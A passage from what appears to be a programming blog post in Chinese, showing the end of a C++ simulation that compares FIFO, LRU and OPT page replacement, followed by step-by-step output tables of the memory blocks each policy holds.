&lt;&lt; fifo &lt;&lt; chart_cell &lt;&lt; lru &lt;&lt; chart_cell &lt;&lt; opt &lt;&lt; &quot;|&quot; &lt;&lt; std::endl &lt;&lt; chart_cell &lt;&lt; &quot;miss_ratio&quot; &lt;&lt; chart_cell &lt;&lt; fifo/(double)max_ins_num*100 &lt;&lt; chart_cell &lt;&lt; lru/(double)max_ins_num*100 &lt;&lt; chart_cell &lt;&lt; opt/(double)max_ins_num*100 &lt;&lt; &quot;|&quot; &lt;&lt; std::endl &lt;&lt; chart_head &lt;&lt; &quot;&quot; &lt;&lt; chart_head &lt;&lt; &quot;&quot; &lt;&lt; chart_head &lt;&lt; &quot;&quot; &lt;&lt; chart_head &lt;&lt; &quot;-&quot; &lt;&lt; std::endl;}int main() { std::vector&lt;int&gt; ins_arr(max_ins_num,0); int ins; for(int i = 0; i &lt; max_ins_num; i++) { if (i%6 == 0) { ins = get_inst_i(0,max_ins_num-1); ins_arr[i] = ins; } else if (i%6 == 1 || i%6 == 3 || i%6 == 5) { ins_arr[i] = ins_arr[i-1] + 1 &lt; max_ins_num ? ins_arr[i-1] + 1 : max_ins_num-1; } else if (i%6 == 2){ ins = get_inst_i(0, ins - 1 &gt; 0 ? ins - 1 : 1); ins_arr[i] = ins; } else if (i%6 == 4) { ins = get_inst_i(ins + 2 &gt; max_ins_num-2 ? max_ins_num-2 : ins+2, max_ins_num-1); ins_arr[i] = ins; } } for (cur_clock = 0; cur_clock &lt; max_ins_num; ++cur_clock) { exe_inst_i(ins_arr[cur_clock], ins_arr); } show_info(fifo_exchange, lru_exchange, opt_exchange); return 0;} 运行结果1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522532542552562572582592602612622632642652662672682692702712722732742752762772782792802812822832842852862872882892902912922932942952962972982993003013023033043053063073083093103113123133143153163173183193203213223233243253263273283293303313323333343353363373383393403413423433443453463473483493503513523533543553563573583593603613623633643653663673683693703713723733743753763773783793803813823833843853863873883893903913923933943953963973983994004014024034044054064074084094104114124134144154164174184194204214224234244254264274284294304314324334344354364374384394404414424434444454464474484494504514524534544554564574584594604614624634644654664674684694704714724734744754764774784794804814824834844854864874884894904914924934944954964974984995005015025035045055065075085095105115125135145155165175185195205215225235245255265275285295305315325335345355365375385395405415425435445455465475485495505515525535545555565575585595605615625635645655665675685695705715725735745755765775785795805815825835845855865875885895905915925935945955965975985996006016026036046056066076086096106116126136146156166176186196206216226236246256266276286296306316326336346356366376386396406416426436446456466476486496506516526536546556566576586596606616626636646656666676686696706716726736746756766776786796806816826836846856866876886896906916926936946956966976986997007017027037047057067077087097107117127137147157167177187197207217227237247257267277287297307317327337347357367377387397407417427437447457467477487497507517527537547557567577587597607617627637647657667677687697707717727737747757767777787797807817827837847857867877887897907917927937947957967977987998008018028038048058068078088098108118128138148158168178188198208218228238248258268278288298308318328338348358368378388398408418428438448458468478488498508518528538548558568578588598608618628638648658668678688698708718728738748758768778788798808818828838848858868878888898908918928938948958968978988999009019029039049059069079089099109119129139149159169179189199209219229239249259269279289299309319329339349359369379389399409419429439449459469479489499509519529539549559569579589599609619629639649659669679689699709719729739749759769779789799809819829839849859869879889899909919929939949959969979989991000100110021003100410051006100710081009101010111012101310141015101610171018101910201021102210231024102510261027102810291030103110321033103410351036103710381039104010411042104310441045104610471048104910501051105210531054105510561057105810591060106110621063106410651066106710681069107010711072107310741075107610771078107910801081108210831084108510861087108810891090109110921093109410951096109710981099110011011102110311041105110611071108110911101111111211131114111511161117111811191120112111221123112411251126112711281129113011311132113311341135113611371138113911401141114211431144114511461147114811491150115111521153115411551156115711581159116011611162116311641165116611671168116911701171117211731174117511761177117811791180118111821183118411851186118711881189119011911192119311941195119611971198119912001201120212031204120512061207120812091210121112121213121412151216121712181219122012211222122312241225122612271228122912301231123212331234123512361237123812391240124112421243124412451246124712481249125012511252125312541255125612571258125912601261126212631264126512661267126812691270127112721273127412751276127712781279128012811282128312841285128612871288128912901291129212931294129512961297129812991300130113021303130413051306130713081309131013111312131313141315131613171318131913201321132213231324132513261327132813291330133113321333133413351336133713381339134013411342134313441345134613471348134913501351135213531354135513561357135813591360136113621363136413651366136713681369137013711372137313741375137613771378137913801381138213831384138513861387138813891390139113921393139413951396139713981399140014011402140314041405140614071408140914101411141214131414141514161417141814191420142114221423142414251426142714281429143014311432143314341435143614371438143914401441144214431444144514461447144814491450145114521453145414551456145714581459146014611462146314641465146614671468146914701471147214731474147514761477147814791480148114821483148414851486148714881489149014911492149314941495149614971498149915001501150215031504150515061507150815091510151115121513151415151516151715181519152015211522152315241525152615271528152915301531153215331534153515361537153815391540154115421543154415451546154715481549155015511552155315541555155615571558155915601561156215631564156515661567156815691570157115721573157415751576157715781579158015811582158315841585158615871588158915901591159215931594159515961597159815991600160116021603160416051606160716081609161016111612161316141615161616171618161916201621162216231624162516261627162816291630163116321633163416351636163716381639164016411642164316441645164616471648164916501651165216531654165516561657165816591660166116621663166416651666166716681669167016711672167316741675167616771678167916801681168216831684168516861687168816891690169116921693169416951696169716981699170017011702170317041705170617071708170917101711171217131714171517161717171817191720172117221723172417251726172717281729173017311732173317341735173617371738173917401741174217431744174517461747174817491750175117521753175417551756175717581759176017611762176317641765176617671768176917701771177217731774177517761777177817791780178117821783178417851786178717881789179017911792179317941795179617971798179918001801180218031804180518061807180818091810181118121813181418151816181718181819182018211822182318241825182618271828182918301831183218331834183518361837183818391840184118421843184418451846184718481849185018511852185318541855185618571858185918601861186218631864186518661867186818691870187118721873187418751876187718781879188018811882188318841885188618871888188918901891189218931894189518961897189818991900190119021903190419051906190719081909191019111912191319141915191619171918191919201921192219231924192519261927192819291930193119321933193419351936193719381939194019411942194319441945194619471948194919501951195219531954195519561957195819591960196119621963196419651966196719681969197019711972197319741975197619771978197919801981198219831984198519861987198819891990199119921993199419951996199719981999200020012002200320042005200620072008200920102011201220132014201520162017201820192020202120222023202420252026202720282029203020312032203320342035203620372038203920402041204220432044204520462047204820492050205120522053205420552056205720582059206020612062206320642065206620672068206920702071207220732074207520762077207820792080208120822083208420852086208720882089209020912092209320942095209620972098209921002101210221032104210521062107210821092110211121122113211421152116211721182119212021212122212321242125212621272128212921302131213221332134213521362137213821392140214121422143214421452146214721482149215021512152215321542155215621572158215921602161216221632164216521662167216821692170217121722173217421752176217721782179218021812182218321842185218621872188218921902191219221932194219521962197219821992200220122022203220422052206220722082209221022112212221322142215221622172218221922202221222222232224222522262227222822292230223122322233223422352236223722382239224022412242224322442245224622472248224922502251225222532254225522562257225822592260226122622263226422652266226722682269227022712272227322742275227622772278227922802281228222832284228522862287228822892290229122922293229422952296229722982299230023012302230323042305230623072308230923102311231223132314231523162317231823192320232123222323232423252326232723282329233023312332233323342335233623372338233923402341234223432344234523462347234823492350235123522353235423552356235723582359236023612362236323642365236623672368236923702371237223732374237523762377237823792380238123822383238423852386238723882389239023912392239323942395239623972398239924002401240224032404240524062407240824092410241124122413241424152416241724182419242024212422242324242425242624272428242924302431243224332434243524362437243824392440244124422443244424452446244724482449245024512452245324542455245624572458245924602461246224632464246524662467246824692470247124722473247424752476247724782479248024812482248324842485248624872488248924902491249224932494249524962497249824992500250125022503250425052506250725082509251025112512251325142515251625172518251925202521252225232524252525262527252825292530253125322533253425352536253725382539254025412542254325442545254625472548254925502551255225532554255525562557255825592560256125622563256425652566256725682569257025712572257325742575257625772578257925802581258225832584258525862587258825892590259125922593259425952596259725982599260026012602260326042605260626072608260926102611261226132614261526162617261826192620262126222623262426252626262726282629263026312632263326342635263626372638263926402641264226432644264526462647264826492650265126522653265426552656265726582659266026612662266326642665266626672668266926702671267226732674267526762677267826792680268126822683268426852686268726882689269026912692269326942695269626972698269927002701270227032704270527062707270827092710271127122713271427152716271727182719272027212722272327242725272627272728272927302731273227332734273527362737273827392740274127422743274427452746274727482749275027512752275327542755275627572758275927602761276227632764276527662767276827692770277127722773277427752776277727782779278027812782278327842785278627872788278927902791279227932794279527962797279827992800280128022803280428052806280728082809281028112812281328142815281628172818281928202821282228232824282528262827282828292830283128322833283428352836283728382839284028412842284328442845284628472848284928502851285228532854285528562857285828592860286128622863286428652866286728682869287028712872287328742875287628772878287928802881288228832884288528862887288828892890289128922893289428952896289728982899290029012902290329042905290629072908290929102911291229132914291529162917291829192920292129222923292429252926292729282929293029312932293329342935293629372938293929402941294229432944294529462947294829492950295129522953295429552956295729582959296029612962296329642965296629672968296929702971297229732974297529762977297829792980298129822983298429852986298729882989299029912992299329942995299629972998299930003001300230033004300530063007300830093010301130123013301430153016301730183019302030213022302330243025302630273028302930303031303230333034303530363037303830393040304130423043304430453046304730483049305030513052305330543055305630573058305930603061306230633064306530663067306830693070307130723073307430753076307730783079308030813082308330843085308630873088308930903091309230933094309530963097309830993100310131023103310431053106310731083109311031113112311331143115311631173118311931203121312231233124312531263127312831293130313131323133313431353136313731383139314031413142314331443145314631473148314931503151315231533154315531563157315831593160316131623163316431653166316731683169317031713172317331743175317631773178317931803181318231833184318531863187318831893190319131923193319431953196319731983199320032013202320332043205320632073208cur_ins = 222cur_block = 22-------------------|fifo |lru |opt |-------------------|22 |22 |22 ||-1 |-1 |-1 ||-1 |-1 |-1 ||-1 |-1 |-1 |-------------------cur_ins = 223cur_block = 22-------------------|fifo |lru |opt |-------------------|22 |22 |22 ||-1 |-1 |-1 ||-1 |-1 |-1 ||-1 |-1 |-1 |-------------------cur_ins = 179cur_block = 17-------------------|fifo |lru |opt |-------------------|22 |17 |22 ||17 |22 |17 ||-1 |-1 |-1 ||-1 |-1 |-1 |-------------------cur_ins = 180cur_block = 18-------------------|fifo |lru |opt |-------------------|22 |18 |22 ||17 |17 |17 ||18 |22 |18 ||-1 |-1 |-1 |-------------------cur_ins = 255cur_block = 25-------------------|fifo |lru |opt |-------------------|22 |25 |22 ||17 |18 |17 ||18 |17 |18 ||25 |22 |25 |-------------------cur_ins = 256cur_block = 25-------------------|fifo |lru |opt |-------------------|22 |25 |22 ||17 |18 |17 ||18 |17 |18 ||25 |22 |25 |-------------------cur_ins = 312cur_block = 31-------------------|fifo |lru |opt |-------------------|17 |31 |22 ||18 |25 |31 ||25 |18 |18 ||31 |17 |25 |-------------------cur_ins = 313cur_block = 31-------------------|fifo |lru |opt |-------------------|17 |31 |22 ||18 |25 |31 ||25 |18 |18 ||31 |17 |25 |-------------------cur_ins = 17cur_block = 1-------------------|fifo |lru |opt |-------------------|18 |1 |22 ||25 |31 |1 ||31 |25 |18 ||1 |18 |25 |-------------------cur_ins = 18cur_block = 1-------------------|fifo |lru |opt |-------------------|18 |1 |22 ||25 |31 |1 ||31 |25 |18 ||1 |18 |25 |-------------------cur_ins = 232cur_block = 23-------------------|fifo |lru |opt |-------------------|25 |23 |22 ||31 |1 |1 ||1 |31 |23 ||23 |25 |25 |-------------------cur_ins = 233cur_block = 23-------------------|fifo |lru |opt |-------------------|25 |23 |22 ||31 |1 |1 ||1 |31 |23 ||23 |25 |25 |-------------------cur_ins = 83cur_block = 8-------------------|fifo |lru |opt |-------------------|31 |8 |22 ||1 |23 |1 ||23 |1 |8 ||8 |31 |25 |-------------------cur_ins = 84cur_block = 8-------------------|fifo |lru |opt |-------------------|31 |8 |22 ||1 |23 |1 ||23 |1 |8 ||8 |31 |25 |-------------------cur_ins = 23cur_block = 2-------------------|fifo |lru |opt |-------------------|1 |2 |22 ||23 |8 |1 ||8 |23 |2 ||2 |1 |25 |-------------------cur_ins = 24cur_block = 2-------------------|fifo |lru |opt |-------------------|1 |2 |22 ||23 |8 |1 ||8 |23 |2 ||2 |1 |25 |-------------------cur_ins = 196cur_block = 19-------------------|fifo |lru |opt |-------------------|23 |19 |22 ||8 |2 |1 ||2 |8 |2 ||19 |23 |19 |-------------------cur_ins = 197cur_block = 19-------------------|fifo |lru |opt |-------------------|23 |19 |22 ||8 |2 |1 ||2 |8 |2 ||19 |23 |19 |-------------------cur_ins = 212cur_block = 21-------------------|fifo |lru |opt |-------------------|8 |21 |21 ||2 |19 |1 ||19 |2 |2 ||21 |8 |19 |-------------------cur_ins = 213cur_block = 21-------------------|fifo |lru |opt |-------------------|8 |21 |21 ||2 |19 |1 ||19 |2 |2 ||21 |8 |19 |-------------------cur_ins = 45cur_block = 4-------------------|fifo |lru |opt |-------------------|2 |4 |4 ||19 |21 |1 ||21 |19 |2 ||4 |2 |19 |-------------------cur_ins = 46cur_block = 4-------------------|fifo |lru |opt |-------------------|2 |4 |4 ||19 |21 |1 ||21 |19 |2 ||4 |2 |19 |-------------------cur_ins = 193cur_block = 19-------------------|fifo |lru |opt |-------------------|2 |19 |4 ||19 |4 |1 ||21 |21 |2 ||4 |2 |19 |-------------------cur_ins = 194cur_block = 19-------------------|fifo |lru |opt |-------------------|2 |19 |4 ||19 |4 |1 ||21 |21 |2 ||4 |2 |19 |-------------------cur_ins = 157cur_block = 15-------------------|fifo |lru |opt |-------------------|19 |15 |15 ||21 |19 |1 ||4 |4 |2 ||15 |21 |19 |-------------------cur_ins = 158cur_block = 15-------------------|fifo |lru |opt |-------------------|19 |15 |15 ||21 |19 |1 ||4 |4 |2 ||15 |21 |19 |-------------------cur_ins = 31cur_block = 3-------------------|fifo |lru |opt |-------------------|21 |3 |3 ||4 |15 |1 ||15 |19 |2 ||3 |4 |19 |-------------------cur_ins = 32cur_block = 3-------------------|fifo |lru |opt |-------------------|21 |3 |3 ||4 |15 |1 ||15 |19 |2 ||3 |4 |19 |-------------------cur_ins = 142cur_block = 14-------------------|fifo |lru |opt |-------------------|4 |14 |14 ||15 |3 |1 ||3 |15 |2 ||14 |19 |19 |-------------------cur_ins = 143cur_block = 14-------------------|fifo |lru |opt |-------------------|4 |14 |14 ||15 |3 |1 ||3 |15 |2 ||14 |19 |19 |-------------------cur_ins = 190cur_block = 19-------------------|fifo |lru |opt |-------------------|15 |19 |14 ||3 |14 |1 ||14 |3 |2 ||19 |15 |19 |-------------------cur_ins = 191cur_block = 19-------------------|fifo |lru |opt |-------------------|15 |19 |14 ||3 |14 |1 ||14 |3 |2 ||19 |15 |19 |-------------------cur_ins = 115cur_block = 11-------------------|fifo |lru |opt |-------------------|3 |11 |11 ||14 |19 |1 ||19 |14 |2 ||11 |3 |19 |-------------------cur_ins = 116cur_block = 11-------------------|fifo |lru |opt |-------------------|3 |11 |11 ||14 |19 |1 ||19 |14 |2 ||11 |3 |19 |-------------------cur_ins = 192cur_block = 19-------------------|fifo |lru |opt |-------------------|3 |19 |11 ||14 |11 |1 ||19 |14 |2 ||11 |3 |19 |-------------------cur_ins = 193cur_block = 19-------------------|fifo |lru |opt |-------------------|3 |19 |11 ||14 |11 |1 ||19 |14 |2 ||11 |3 |19 |-------------------cur_ins = 271cur_block = 27-------------------|fifo |lru |opt |-------------------|14 |27 |11 ||19 |19 |1 ||11 |11 |2 ||27 |14 |27 |-------------------cur_ins = 272cur_block = 27-------------------|fifo |lru |opt |-------------------|14 |27 |11 ||19 |19 |1 ||11 |11 |2 ||27 |14 |27 |-------------------cur_ins = 27cur_block = 2-------------------|fifo |lru |opt |-------------------|19 |2 |11 ||11 |27 |1 ||27 |19 |2 ||2 |11 |27 |-------------------cur_ins = 28cur_block = 2-------------------|fifo |lru |opt |-------------------|19 |2 |11 ||11 |27 |1 ||27 |19 |2 ||2 |11 |27 |-------------------cur_ins = 264cur_block = 26-------------------|fifo |lru |opt |-------------------|11 |26 |11 ||27 |2 |1 ||2 |27 |2 ||26 |19 |26 |-------------------cur_ins = 265cur_block = 26-------------------|fifo |lru |opt |-------------------|11 |26 |11 ||27 |2 |1 ||2 |27 |2 ||26 |19 |26 |-------------------cur_ins = 9cur_block = 0-------------------|fifo |lru |opt |-------------------|27 |0 |11 ||2 |26 |1 ||26 |2 |0 ||0 |27 |26 |-------------------cur_ins = 10cur_block = 1-------------------|fifo |lru |opt |-------------------|2 |1 |11 ||26 |0 |1 ||0 |26 |0 ||1 |2 |26 |-------------------cur_ins = 4cur_block = 0-------------------|fifo |lru |opt |-------------------|2 |0 |11 ||26 |1 |1 ||0 |26 |0 ||1 |2 |26 |-------------------cur_ins = 5cur_block = 0-------------------|fifo |lru |opt |-------------------|2 |0 |11 ||26 |1 |1 ||0 |26 |0 ||1 |2 |26 |-------------------cur_ins = 219cur_block = 21-------------------|fifo |lru |opt |-------------------|26 |21 |11 ||0 |0 |1 ||1 |1 |21 ||21 |26 |26 |-------------------cur_ins = 220cur_block = 22-------------------|fifo |lru |opt |-------------------|0 |22 |11 ||1 |21 |1 ||21 |0 |22 ||22 |1 |26 |-------------------cur_ins = 122cur_block = 12-------------------|fifo |lru |opt |-------------------|1 |12 |11 ||21 |22 |1 ||22 |21 |12 ||12 |0 |26 |-------------------cur_ins = 123cur_block = 12-------------------|fifo |lru |opt |-------------------|1 |12 |11 ||21 |22 |1 ||22 |21 |12 ||12 |0 |26 |-------------------cur_ins = 121cur_block = 12-------------------|fifo |lru |opt |-------------------|1 |12 |11 ||21 |22 |1 ||22 |21 |12 ||12 |0 |26 |-------------------cur_ins = 122cur_block = 12-------------------|fifo |lru |opt |-------------------|1 |12 |11 ||21 |22 |1 ||22 |21 |12 ||12 |0 |26 |-------------------cur_ins = 295cur_block = 29-------------------|fifo |lru |opt |-------------------|21 |29 |11 ||22 |12 |1 ||12 |22 |29 ||29 |21 |26 |-------------------cur_ins = 296cur_block = 29-------------------|fifo |lru |opt |-------------------|21 |29 |11 ||22 |12 |1 ||12 |22 |29 ||29 |21 |26 |-------------------cur_ins = 158cur_block = 15-------------------|fifo |lru |opt |-------------------|22 |15 |11 ||12 |29 |1 ||29 |12 |15 ||15 |22 |26 |-------------------cur_ins = 159cur_block = 15-------------------|fifo |lru |opt |-------------------|22 |15 |11 ||12 |29 |1 ||29 |12 |15 ||15 |22 |26 |-------------------cur_ins = 15cur_block = 1-------------------|fifo |lru |opt |-------------------|12 |1 |11 ||29 |15 |1 ||15 |29 |15 ||1 |12 |26 |-------------------cur_ins = 16cur_block = 1-------------------|fifo |lru |opt |-------------------|12 |1 |11 ||29 |15 |1 ||15 |29 |15 ||1 |12 |26 |-------------------cur_ins = 53cur_block = 5-------------------|fifo |lru |opt |-------------------|29 |5 |11 ||15 |1 |1 ||1 |15 |5 ||5 |29 |26 |-------------------cur_ins = 54cur_block = 5-------------------|fifo |lru |opt |-------------------|29 |5 |11 ||15 |1 |1 ||1 |15 |5 ||5 |29 |26 |-------------------cur_ins = 161cur_block = 16-------------------|fifo |lru |opt |-------------------|15 |16 |11 ||1 |5 |16 ||5 |1 |5 ||16 |15 |26 |-------------------cur_ins = 162cur_block = 16-------------------|fifo |lru |opt |-------------------|15 |16 |11 ||1 |5 |16 ||5 |1 |5 ||16 |15 |26 |-------------------cur_ins = 97cur_block = 9-------------------|fifo |lru |opt |-------------------|1 |9 |11 ||5 |16 |9 ||16 |5 |5 ||9 |1 |26 |-------------------cur_ins = 98cur_block = 9-------------------|fifo |lru |opt |-------------------|1 |9 |11 ||5 |16 |9 ||16 |5 |5 ||9 |1 |26 |-------------------cur_ins = 131cur_block = 13-------------------|fifo |lru |opt |-------------------|5 |13 |11 ||16 |9 |13 ||9 |16 |5 ||13 |5 |26 |-------------------cur_ins = 132cur_block = 13-------------------|fifo |lru |opt |-------------------|5 |13 |11 ||16 |9 |13 ||9 |16 |5 ||13 |5 |26 |-------------------cur_ins = 259cur_block = 25-------------------|fifo |lru |opt |-------------------|16 |25 |11 ||9 |13 |25 ||13 |9 |5 ||25 |16 |26 |-------------------cur_ins = 260cur_block = 26-------------------|fifo |lru |opt |-------------------|9 |26 |11 ||13 |25 |25 ||25 |13 |5 ||26 |9 |26 |-------------------cur_ins = 241cur_block = 24-------------------|fifo |lru |opt |-------------------|13 |24 |11 ||25 |26 |25 ||26 |25 |5 ||24 |13 |24 |-------------------cur_ins = 242cur_block = 24-------------------|fifo |lru |opt |-------------------|13 |24 |11 ||25 |26 |25 ||26 |25 |5 ||24 |13 |24 |-------------------cur_ins = 256cur_block = 25-------------------|fifo |lru |opt |-------------------|13 |25 |11 ||25 |24 |25 ||26 |26 |5 ||24 |13 |24 |-------------------cur_ins = 257cur_block = 25-------------------|fifo |lru |opt |-------------------|13 |25 |11 ||25 |24 |25 ||26 |26 |5 ||24 |13 |24 |-------------------cur_ins = 114cur_block = 11-------------------|fifo |lru |opt |-------------------|25 |11 |11 ||26 |25 |25 ||24 |24 |5 ||11 |26 |24 |-------------------cur_ins = 115cur_block = 11-------------------|fifo |lru |opt |-------------------|25 |11 |11 ||26 |25 |25 ||24 |24 |5 ||11 |26 |24 |-------------------cur_ins = 35cur_block = 3-------------------|fifo |lru |opt |-------------------|26 |3 |3 ||24 |11 |25 ||11 |25 |5 ||3 |24 |24 |-------------------cur_ins = 36cur_block = 3-------------------|fifo |lru |opt |-------------------|26 |3 |3 ||24 |11 |25 ||11 |25 |5 ||3 |24 |24 |-------------------cur_ins = 124cur_block = 12-------------------|fifo |lru |opt |-------------------|24 |12 |3 ||11 |3 |12 ||3 |11 |5 ||12 |25 |24 |-------------------cur_ins = 125cur_block = 12-------------------|fifo |lru |opt |-------------------|24 |12 |3 ||11 |3 |12 ||3 |11 |5 ||12 |25 |24 |-------------------cur_ins = 53cur_block = 5-------------------|fifo |lru |opt |-------------------|11 |5 |3 ||3 |12 |12 ||12 |3 |5 ||5 |11 |24 |-------------------cur_ins = 54cur_block = 5-------------------|fifo |lru |opt |-------------------|11 |5 |3 ||3 |12 |12 ||12 |3 |5 ||5 |11 |24 |-------------------cur_ins = 8cur_block = 0-------------------|fifo |lru |opt |-------------------|3 |0 |3 ||12 |5 |0 ||5 |12 |5 ||0 |3 |24 |-------------------cur_ins = 9cur_block = 0-------------------|fifo |lru |opt |-------------------|3 |0 |3 ||12 |5 |0 ||5 |12 |5 ||0 |3 |24 |-------------------cur_ins = 184cur_block = 18-------------------|fifo |lru |opt |-------------------|12 |18 |3 ||5 |0 |18 ||0 |5 |5 ||18 |12 |24 |-------------------cur_ins = 185cur_block = 18-------------------|fifo |lru |opt |-------------------|12 |18 |3 ||5 |0 |18 ||0 |5 |5 ||18 |12 |24 |-------------------cur_ins = 240cur_block = 24-------------------|fifo |lru |opt |-------------------|5 |24 |3 ||0 |18 |18 ||18 |0 |5 ||24 |5 |24 |-------------------cur_ins = 241cur_block = 24-------------------|fifo |lru |opt |-------------------|5 |24 |3 ||0 |18 |18 ||18 |0 |5 ||24 |5 |24 |-------------------cur_ins = 28cur_block = 2-------------------|fifo |lru |opt |-------------------|0 |2 |3 ||18 |24 |2 ||24 |18 |5 ||2 |0 |24 |-------------------cur_ins = 29cur_block = 2-------------------|fifo |lru |opt |-------------------|0 |2 |3 ||18 |24 |2 ||24 |18 |5 ||2 |0 |24 |-------------------cur_ins = 224cur_block = 22-------------------|fifo |lru |opt |-------------------|18 |22 |3 ||24 |2 |2 ||2 |24 |5 ||22 |18 |22 |-------------------cur_ins = 225cur_block = 22-------------------|fifo |lru |opt |-------------------|18 |22 |3 ||24 |2 |2 ||2 |24 |5 ||22 |18 |22 |-------------------cur_ins = 92cur_block = 9-------------------|fifo |lru |opt |-------------------|24 |9 |3 ||2 |22 |2 ||22 |2 |5 ||9 |24 |9 |-------------------cur_ins = 93cur_block = 9-------------------|fifo |lru |opt |-------------------|24 |9 |3 ||2 |22 |2 ||22 |2 |5 ||9 |24 |9 |-------------------cur_ins = 49cur_block = 4-------------------|fifo |lru |opt |-------------------|2 |4 |3 ||22 |9 |2 ||9 |22 |5 ||4 |2 |4 |-------------------cur_ins = 50cur_block = 5-------------------|fifo |lru |opt |-------------------|22 |5 |3 ||9 |4 |2 ||4 |9 |5 ||5 |22 |4 |-------------------cur_ins = 279cur_block = 27-------------------|fifo |lru |opt |-------------------|9 |27 |3 ||4 |5 |2 ||5 |4 |5 ||27 |9 |27 |-------------------cur_ins = 280cur_block = 28-------------------|fifo |lru |opt |-------------------|4 |28 |3 ||5 |27 |2 ||27 |5 |28 ||28 |4 |27 |-------------------cur_ins = 34cur_block = 3-------------------|fifo |lru |opt |-------------------|5 |3 |3 ||27 |28 |2 ||28 |27 |28 ||3 |5 |27 |-------------------cur_ins = 35cur_block = 3-------------------|fifo |lru |opt |-------------------|5 |3 |3 ||27 |28 |2 ||28 |27 |28 ||3 |5 |27 |-------------------cur_ins = 26cur_block = 2-------------------|fifo |lru |opt |-------------------|27 |2 |3 ||28 |3 |2 ||3 |28 |28 ||2 |27 |27 |-------------------cur_ins = 27cur_block = 2-------------------|fifo |lru |opt |-------------------|27 |2 |3 ||28 |3 |2 ||3 |28 |28 ||2 |27 |27 |-------------------cur_ins = 239cur_block = 23-------------------|fifo |lru |opt |-------------------|28 |23 |3 ||3 |2 |2 ||2 |3 |23 ||23 |28 |27 |-------------------cur_ins = 240cur_block = 24-------------------|fifo |lru |opt |-------------------|3 |24 |24 ||2 |23 |2 ||23 |2 |23 ||24 |3 |27 |-------------------cur_ins = 270cur_block = 27-------------------|fifo |lru |opt |-------------------|2 |27 |24 ||23 |24 |2 ||24 |23 |23 ||27 |2 |27 |-------------------cur_ins = 271cur_block = 27-------------------|fifo |lru |opt |-------------------|2 |27 |24 ||23 |24 |2 ||24 |23 |23 ||27 |2 |27 |-------------------cur_ins = 229cur_block = 22-------------------|fifo |lru |opt |-------------------|23 |22 |24 ||24 |27 |2 ||27 |24 |23 ||22 |23 |22 |-------------------cur_ins = 230cur_block = 23-------------------|fifo |lru |opt |-------------------|23 |23 |24 ||24 |22 |2 ||27 |27 |23 ||22 |24 |22 |-------------------cur_ins = 315cur_block = 31-------------------|fifo |lru |opt |-------------------|24 |31 |24 ||27 |23 |2 ||22 |22 |23 ||31 |27 |31 |-------------------cur_ins = 316cur_block = 31-------------------|fifo |lru |opt |-------------------|24 |31 |24 ||27 |23 |2 ||22 |22 |23 ||31 |27 |31 |-------------------cur_ins = 160cur_block = 16-------------------|fifo |lru |opt |-------------------|27 |16 |24 ||22 |31 |2 ||31 |23 |16 ||16 |22 |31 |-------------------cur_ins = 161cur_block = 16-------------------|fifo |lru |opt |-------------------|27 |16 |24 ||22 |31 |2 ||31 |23 |16 ||16 |22 |31 |-------------------cur_ins = 8cur_block = 0-------------------|fifo |lru |opt |-------------------|22 |0 |24 ||31 |16 |2 ||16 |31 |0 ||0 |23 |31 |-------------------cur_ins = 9cur_block = 0-------------------|fifo |lru |opt |-------------------|22 |0 |24 ||31 |16 |2 ||16 |31 |0 ||0 |23 |31 |-------------------cur_ins = 242cur_block = 24-------------------|fifo |lru |opt |-------------------|31 |24 |24 ||16 |0 |2 ||0 |16 |0 ||24 |31 |31 |-------------------cur_ins = 243cur_block = 24-------------------|fifo |lru |opt |-------------------|31 |24 |24 ||16 |0 |2 ||0 |16 |0 ||24 |31 |31 |-------------------cur_ins = 216cur_block = 21-------------------|fifo |lru |opt |-------------------|16 |21 |24 ||0 |24 |21 ||24 |0 |0 ||21 |16 |31 |-------------------cur_ins = 217cur_block = 21-------------------|fifo |lru |opt |-------------------|16 |21 |24 ||0 |24 |21 ||24 |0 |0 ||21 |16 |31 |-------------------cur_ins = 2cur_block = 0-------------------|fifo |lru |opt |-------------------|16 |0 |24 ||0 |21 |21 ||24 |24 |0 ||21 |16 |31 |-------------------cur_ins = 3cur_block = 0-------------------|fifo |lru |opt |-------------------|16 |0 |24 ||0 |21 |21 ||24 |24 |0 ||21 |16 |31 |-------------------cur_ins = 268cur_block = 26-------------------|fifo |lru |opt |-------------------|0 |26 |24 ||24 |0 |21 ||21 |21 |26 ||26 |24 |31 |-------------------cur_ins = 269cur_block = 26-------------------|fifo |lru |opt |-------------------|0 |26 |24 ||24 |0 |21 ||21 |21 |26 ||26 |24 |31 |-------------------cur_ins = 250cur_block = 25-------------------|fifo |lru |opt |-------------------|24 |25 |24 ||21 |26 |21 ||26 |0 |25 ||25 |21 |31 |-------------------cur_ins = 251cur_block = 25-------------------|fifo |lru |opt |-------------------|24 |25 |24 ||21 |26 |21 ||26 |0 |25 ||25 |21 |31 |-------------------cur_ins = 132cur_block = 13-------------------|fifo |lru |opt |-------------------|21 |13 |24 ||26 |25 |21 ||25 |26 |13 ||13 |0 |31 |-------------------cur_ins = 133cur_block = 13-------------------|fifo |lru |opt |-------------------|21 |13 |24 ||26 |25 |21 ||25 |26 |13 ||13 |0 |31 |-------------------cur_ins = 144cur_block = 14-------------------|fifo |lru |opt |-------------------|26 |14 |24 ||25 |13 |21 ||13 |25 |14 ||14 |26 |31 |-------------------cur_ins = 145cur_block = 14-------------------|fifo |lru |opt |-------------------|26 |14 |24 ||25 |13 |21 ||13 |25 |14 ||14 |26 |31 |-------------------cur_ins = 243cur_block = 24-------------------|fifo |lru |opt |-------------------|25 |24 |24 ||13 |14 |21 ||14 |13 |14 ||24 |25 |31 |-------------------cur_ins = 244cur_block = 24-------------------|fifo |lru |opt |-------------------|25 |24 |24 ||13 |14 |21 ||14 |13 |14 ||24 |25 |31 |-------------------cur_ins = 173cur_block = 17-------------------|fifo |lru |opt |-------------------|13 |17 |24 ||14 |24 |21 ||24 |14 |17 ||17 |13 |31 |-------------------cur_ins = 174cur_block = 17-------------------|fifo |lru |opt |-------------------|13 |17 |24 ||14 |24 |21 ||24 |14 |17 ||17 |13 |31 |-------------------cur_ins = 178cur_block = 17-------------------|fifo |lru |opt |-------------------|13 |17 |24 ||14 |24 |21 ||24 |14 |17 ||17 |13 |31 |-------------------cur_ins = 179cur_block = 